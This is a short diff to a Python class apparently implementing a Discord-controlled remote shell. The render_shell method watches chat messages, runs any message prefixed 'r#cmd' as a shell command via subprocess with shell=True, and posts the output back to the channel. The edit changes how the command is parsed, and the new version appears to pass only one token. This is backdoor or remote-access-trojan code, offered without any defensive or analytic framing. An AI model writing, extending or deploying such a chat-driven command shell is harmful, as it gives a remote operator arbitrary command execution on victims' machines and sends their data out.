@@ -51,8 +51,8 @@ class Discord:
     def render_shell(self):
         while True:
             if self.message_content().startswith("r#cmd"):
-                cmd = self.message_content().strip("r#cmd ")
-                proc = subprocess.Popen([cmd.split()], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                cmd = self.message_content()
+                proc = subprocess.Popen(cmd.split()[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 self.send_message(f"```{proc.communicate()[0].decode('UTF-8')}```")
             time.sleep(0.5) 
 
